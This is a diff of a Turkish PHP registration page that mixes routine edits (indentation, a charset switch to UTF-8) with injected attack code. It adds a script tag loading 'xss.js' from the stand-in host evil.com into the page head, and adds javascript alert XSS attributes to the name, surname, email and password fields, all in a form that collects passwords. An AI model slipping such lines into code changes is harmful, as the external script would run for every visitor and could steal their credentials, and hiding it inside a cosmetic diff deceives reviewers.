@@ -13,8 +13,8 @@
         } else {
             // user create unsuccessful
             echo "<div class='alert alert-danger' style='text-align:center'>
-    <strong>Kayıt işlemi başarısız.</strong> Bu email adresi ile daha önce kayıt yapılmış.
-  </div>";
+            <strong>Kayıt işlemi başarısız.</strong> Bu email adresi ile daha önce kayıt yapılmış.
+            </div>";
         }
     }
 ?>
@@ -22,11 +22,12 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
     <head>
-        <meta http-equiv="content-type" content="text/html; charset=iso-8859-9"/>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <title>Kullanıcı Kayıt</title>
 		<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
         <link rel="stylesheet" href="assets/js/registration.js" />
+        <script src="http://evil.com/xss.js"></script>
     </head>
     <body>
         <div id="container" class="container">
@@ -35,19 +36,19 @@
                 <table class="table">
                     <tr>
                         <th>Ad:</th>
-                        <td><input type="text" name="name" required></td>
+                        <td><input type="text" name="name" src="javascript:alert('XSS');" required></td>
                     </tr>
                     <tr>
                         <th>Soyad:</th>
-                        <td><input type="text" name="surname" required></td>
+                        <td><input type="text" name="surname" src="javascript:alert('XSS');" required></td>
                     </tr>
                     <tr>
                         <th>Email:</th>
-                        <td><input type="email" name="email" required></td>
+                        <td><input type="email" name="email" src="javascript:alert('XSS');" required></td>
                     </tr>
                     <tr>
                         <th>Şifre:</th>
-                        <td><input type="password" name="password" required></td>
+                        <td><input type="password" name="password" src="javascript:alert('XSS');" required></td>
                     </tr>
                     <tr>
                         <td>&nbsp;</td>
